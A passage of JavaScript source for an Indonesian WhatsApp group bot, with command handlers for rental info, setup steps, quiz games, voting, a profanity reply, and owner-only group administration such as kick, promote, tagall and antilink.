                ikycoli.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/eeaf2fac29390c8e85181.jpg' }, caption: `*Hai Kak ${m.pushName}*\n\n Bot Rental Prices\n││᭄⃟ꪶ⃟•╾ 13k Per Group via E-Walet 1 Month\n││᭄⃟ꪶ⃟•╾ 18k via pulsa 1 Month\n\n Premium Price Bot\n││᭄⃟ꪶ⃟•╾ 8k per User 1 bulan\n\nPayment can be via Paypal/link aja/pulsa\n\nFor more details, you can chat with the owner\nhttps://wa.me/6281364111257 (Owner)\n\nDonate For Me : \n\n││᭄⃟ꪶ⃟•╾ Paypal : https://www.paypal.me/Cakhaho\n││᭄⃟ꪶ⃟•╾ Saweria : https://saweria.co/DikaArdnt` }, { quoted: m })
            }
            break
case 'sc': case 'script': {
m.reply(`╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮\n┃╭┈─────────────⩵꙰ཱི࿐\n┃╰── ⏤͟͟͞Script Bot ──➤ ↶↷\n╰━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━͙✩̣̣̣̣\n ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬\n╭━━•›\n││᭄⃟ꪶ⃟•╾ Subscribe Channel\n││᭄⃟ꪶ⃟•╾ IKYY MAKERZ\n││᭄⃟ꪶ⃟•╾ https://youtube.com/channel/UCQmja37q_Pap24MgG0vUITQ\n╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐\n ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬\napt update && apt upgrade\napt install git -y\napt install nodejs -y\napt install ffmpeg -y\ngit clone https://github.com/IkyyMakerzz/iky-privatemaster\ncd iky-privatemaster\npkg install yarn\nyarn\nnpm install\npkg install mc\nmc\nhapus session nya\nnode .`)
            }        
            break

case 'ajg': case 'anjing': case 'memek': case 'kntl': case 'ngentot': case 'babi': case 'gblk': case 'goblok': case 'telaso': case 'pantek': case 'asu': case 'kontol': case 'Anj': {
m.reply('Jangan Toxic ya syg aku❤')
ikycoli.sendMessage(m.chat, {audio: fs.readFileSync('./src/dosa pantek.mp3'), mimetype: 'audio/mpeg', ptt:true })
   }
   break
case 'autovn': {
if (!isCreator && !isBan) return 
if (args.length < 1) return m.reply(`Ketik on untuk mengaktifkan\nKetik off untuk menonaktifkan`)
if (args[0] === 'on') {
if (autorecording === true) return
global.autorecording = true
m.reply(`Berhasil mengaktifkan autovn!`)
} else if (args[0] === 'off') {
if (autorecording === false) return
global.autorecording = false
m.reply(`Berhasil menonaktifkan autovn!`)
} else {
m.reply('Pilih on atau off')
}
}
break

case 'autoketik': {
if (!isCreator && !isBan) return 
if (args.length < 1) return m.reply(`Ketik on untuk mengaktifkan\nKetik off untuk menonaktifkan`)
if (args[0] === 'on') {
if (autoketik === true) return
global.autoketik = true
m.reply(`Berhasil mengaktifkan autoketik!`)
} else if (args[0] === 'off') {
if (autoketik === false) return
global.autoketik = false
m.reply(`Berhasil menonaktifkan autoketik!`)
} else {
m.reply('Pilih on atau off')
}
}
break

case 'autoavailable': {
if (!isCreator && !isBan) return 
if (args.length < 1) return m.reply(`Ketik on untuk mengaktifkan\nKetik off untuk menonaktifkan`)
if (args[0] === 'on') {
if (autoavailable === true) return
global.autoavailable = true
m.reply(`Berhasil mengaktifkan autoavailable!`)
} else if (args[0] === 'off') {
if (autoavailable === false) return
global.autoavailable = false
m.reply(`Berhasil menonaktifkan autoavailable!`)
} else {
m.reply('Pilih on atau off')
}
}
break
            case 'chat': {
                if (!isCreator) throw mess.owner
                if (!q) throw 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete'
                if (args[0] === 'mute') {
                    ikycoli.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unmute') {
                    ikycoli.chatModify({ mute: null }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'archive') {
                    ikycoli.chatModify({  archive: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unarchive') {
                    ikycoli.chatModify({ archive: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'read') {
                    ikycoli.chatModify({ markRead: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unread') {
                    ikycoli.chatModify({ markRead: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'delete') {
                    ikycoli.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                }
            }
            break
	    case 'family100': {
                if ('family100'+m.chat in _family100) {
                    m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
                    throw false
                }
                let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
                _family100['family100'+m.chat] = {
                    id: 'family100'+m.chat,
                    pesan: await ikycoli.sendText(m.chat, hasil, m),
                    ...random,
                    terjawab: Array.from(random.jawaban, () => false),
                    hadiah: 6,
                }
            }
            break
            case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
            if (!m.quoted && !text) throw `Kirim/reply text dengan caption ${prefix + command}`
            ter = command[1].toLowerCase()
            tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
            m.reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
            break
            case 'tebak': {
                if (!text) throw `Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6.lontong`
                if (args[0] === "lagu") {
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://fatiharridho.github.io/tebaklagu.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    let msg = await ikycoli.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: m })
                    ikycoli.sendText(m.chat, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
                    tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    ikycoli.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, ikycoli.user.name, m)
                    delete tebaklagu[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'gambar') {
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    ikycoli.sendImage(m.chat, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
                    tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    ikycoli.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, ikycoli.user.name, m)
                    delete tebakgambar[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kata') {
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    ikycoli.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                    tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    ikycoli.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, ikycoli.user.name, m)
                    delete tebakkata[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kalimat') {
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    ikycoli.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                    tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    ikycoli.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, ikycoli.user.name, m)
                    delete tebakkalimat[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'lirik') {
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    ikycoli.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
                    tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    ikycoli.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, ikycoli.user.name, m)
                    delete tebaklirik[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'lontong') {
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    ikycoli.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
                    caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
		    caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
                    })
                    await sleep(60000)
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    ikycoli.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, ikycoli.user.name, m)
                    delete caklontong[m.sender.split('@')[0]]
		    delete caklontong_desk[m.sender.split('@')[0]]
                    }
                }
            }
            break
            case 'kuismath': case 'math': {
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                let { genMath, modes } = require('./src/math')
                if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`
                let result = await genMath(text.toLowerCase())
                ikycoli.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    m.reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break
            case 'jodohku': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `👫Jodoh mu adalah

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            let ments = [me, jodoh]
            let buttons = [
                        { buttonId: 'jodohku', buttonText: { displayText: 'Jodohku' }, type: 1 }
                    ]
                    await ikycoli.sendButtonText(m.chat, buttons, jawab, ikycoli.user.name, m, {mentions: ments})
            }
            break
            case 'jadian': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `Ciee yang Jadian💖 Jangan lupa pajak jadiannya🐤

@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            let menst = [orang, jodoh]
            let buttons = [
                        { buttonId: 'jadian', buttonText: { displayText: 'Jodohku' }, type: 1 }
                    ]
                    await ikycoli.sendButtonText(m.chat, buttons, jawab, ikycoli.user.name, m, {mentions: menst})
            }
            break
case 'restart':
if (!isCreator) return
await m.reply(`Restarting...`)
exec(`cd && node index`)
await sleep(4000)
m.reply('Sukses')
break
            case 'react': {
                if (!isCreator) return
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                ikycoli.sendMessage(m.chat, reactionMessage)
            }
            break  
            case 'join': {
                if (!isCreator) return
                if (!text) throw 'Masukkan Link Group!'
                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
                m.reply(mess.wait)
                let result = args[0].split('https://chat.whatsapp.com/')[1]
                await ikycoli.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'leave': {
                if (!isCreator) return
                await ikycoli.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'setexif': {
               if (!isCreator) return
               if (!text) throw `Example : ${prefix + command} packname|author`
          global.packname = text.split("|")[0]
          global.author = text.split("|")[1]
          m.reply(`Exif berhasil diubah menjadi\n\n││᭄⃟ꪶ⃟•╾ Packname : ${global.packname}\n││᭄⃟ꪶ⃟•╾ Author : ${global.author}`)
            }
            break
	case 'kick': {
	if (!isCreator) return
		if (!m.isGroup) throw mess.group
         if (!isBotAdmins) throw mess.botAdmin
         if (!isAdmins) throw vnAdmin(from)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await ikycoli.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'add': {
	if (!isCreator) return
		if (!m.isGroup) throw mess.group
        if (!isBotAdmins) throw mess.botAdmin
        if (!isAdmins) throw vnAdmin(from)
		let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await ikycoli.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'promote': {
	if (!isCreator) return
		if (!m.isGroup) throw mess.group
        if (!isBotAdmins) throw mess.botAdmin
        if (!isAdmins) throw vnAdmin(from)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await ikycoli.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'demote': {
	    if (!isCreator) return
		if (!m.isGroup) throw mess.group
        if (!isBotAdmins) throw mess.botAdmin
        if (!isAdmins) throw vnAdmin(from)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await ikycoli.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'block': {
		if (!isCreator) return
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await ikycoli.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'unblock': {
		if (!isCreator) return
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await ikycoli.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	    case 'setname': case 'setsubject': {
	    if (!isCreator) return
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw vnAdmin(from)
                if (!text) throw 'Text ?'
                await ikycoli.groupUpdateSubject(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case 'setdesc': case 'setdesk': {
          if (!isCreator) return
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw vnAdmin(from)
                if (!text) throw 'Text ?'
                await ikycoli.groupUpdateDescription(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case 'setppbot': {
                if (!isCreator) return
                if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                let media = await ikycoli.downloadAndSaveMediaMessage(quoted)
                await ikycoli.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.success)
                }
                break
           case 'setppgroup': case 'setppgrup': case 'setppgc': {
                if (!isCreator) return
                if (!m.isGroup) throw mess.group
                if (!isAdmins) throw vnAdmin(from)
                if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                let media = await ikycoli.downloadAndSaveMediaMessage(quoted)
                await ikycoli.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.success)
                }
                break
            case 'tagall': {
                if (!isCreator) return
                if (!m.isGroup) throw mess.group
                
let teks = `══✪〘 👥 Tag All 〙✪══
•━══〘тнєιкувσтz〙══━• \nINFO: ${q ? q : 'kosong'}\n•━══〘тнєιкувσтz〙══━• \n`
                for (let mem of participants) {
                teks += `╭━═════════════━• \n││᭄⃟ꪶ⃟•╾ @${mem.id.split('@')[0]}\n╰━═════════════━•\n•━══〘Iιкувσтz〙══━• `
                }
                ikycoli.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
                }
                break
                case 'hidetag': {
                if (!isCreator) return
            if (!m.isGroup) throw mess.group
            ikycoli.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
            }
            break
	    case 'style': case 'styletext': {
	        if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
		let { styletext } = require('./lib/scraper')
		if (!text) throw 'Masukkan Query text!'
                let anu = await styletext(text)
                let teks = `Srtle Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `││᭄⃟ꪶ⃟•╾ *${i.name}* : ${i.result}\n\n`
                }
                m.reply(teks)
	    }
	    break
               case 'vote': {
            if (!m.isGroup) throw mess.group
            if (m.chat in vote) throw `_Masih ada vote di chat ini!_\n\n*${prefix}hapusvote* - untuk menghapus vote`
            if (!text) throw `Masukkan Alasan Melakukan Vote, Example: *${prefix + command} Owner Ganteng*`
            m.reply(`Vote dimulai!\n\n*${prefix}upvote* - untuk ya\n*${prefix}devote* - untuk tidak\n*${prefix}cekvote* - untuk mengecek vote\n*${prefix}hapusvote* - untuk menghapus vote`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
let buttonsVote = [
  {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
  {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
]

            let buttonMessageVote = {
                text: teks_vote,
                footer: ikycoli.user.name,
                buttons: buttonsVote,
                headerType: 1
            }
            ikycoli.sendMessage(m.chat, buttonMessageVote)
	    }
            break
               case 'upvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'Kamu Sudah Vote'
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
            let buttonsUpvote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
            ]

            let buttonMessageUpvote = {
                text: teks_vote,
                footer: ikycoli.user.name,
                buttons: buttonsUpvote,
                headerType: 1,
                mentions: menvote
             }
            ikycoli.sendMessage(m.chat, buttonMessageUpvote)
	    }
             break
                case 'devote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'Kamu Sudah Vote'
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
            let buttonsDevote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
            ]

            let buttonMessageDevote = {
                text: teks_vote,
                footer: ikycoli.user.name,
                buttons: buttonsDevote,
                headerType: 1,
                mentions: menvote
            }
            ikycoli.sendMessage(m.chat, buttonMessageDevote)
	}
            break
                 
case 'cekvote':
if (!m.isGroup) throw mess.group
if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote


©${ikycoli.user.id}
`
ikycoli.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case'delvote': case 'hapusvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            delete vote[m.chat]
            m.reply('Berhasil Menghapus Sesi Vote Di Grup Ini')
	    }
            break
               case 'group': case 'grup': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw vnAdmin(from)
                if (args[0] === 'close'){
                    await ikycoli.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'open'){
                    await ikycoli.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
                } else {
                let buttons = [
                        { buttonId: 'group open', buttonText: { displayText: 'Open' }, type: 1 },
                        { buttonId: 'group close', buttonText: { displayText: 'Close' }, type: 1 }
                    ]
                    await ikycoli.sendButtonText(m.chat, buttons, `Mode Group`, ikycoli.user.name, m)

             }
            }
            break
            case 'editinfo': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw vnAdmin(from)
             if (args[0] === 'open'){
                await ikycoli.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
             } else if (args[0] === 'close'){
                await ikycoli.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
             } else {
             let buttons = [
                        { buttonId: 'editinfo open', buttonText: { displayText: 'Open' }, type: 1 },
                        { buttonId: 'editinfo close', buttonText: { displayText: 'Close' }, type: 1 }
                    ]
                    await ikycoli.sendButtonText(m.chat, buttons, `Mode Edit Info`, ikycoli.user.name, m)

            }
            }
            break

case 'autoread':
	if (!isCreator) return m.reply(`Khusus owner owner ajah`)
	if (args[0] == 'on') {
		if (autoread) return m.reply('*Sudah aktif!*')
		autoread = true
		m.reply('*Berhasil mengaktifkan auto read sw*')
	} else if (args[0] == 'off') {
		if (!autoread) return m.reply('*Belum aktif!*')
		autoread = false
		m.reply('*Berhasil mematikan auto read sw*')
	} else {
		m.reply('Pilih on atau off!')
	}
	break
case 'welcome': {
if (!isCreator) return 
if (isBan) return 
if (!m.isGroup) return mess.group
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (welcm) return m.reply('Sudah Aktif')
wlcm.push(from)
m.reply('Succes menyalakan welcome di group ini 🌷')
} else if (args[0] === "off") {
if (!welcm) return m.reply('Sudah Mati')
let off = wlcm.indexOf(from)
wlcm.splice(off, 1)
m.reply('Succes mematikan welcome di group ini 🌷')
} else {
m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
            case 'antilink': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw vnAdmin(from)
                if (args[0] === "on") {
                if (db.data.chats[m.chat].antilink) return m.reply(`Sudah Aktif Sebelumnya`)
                db.data.chats[m.chat].antilink = true
                m.reply(`Antilink Aktif !`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].antilink) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
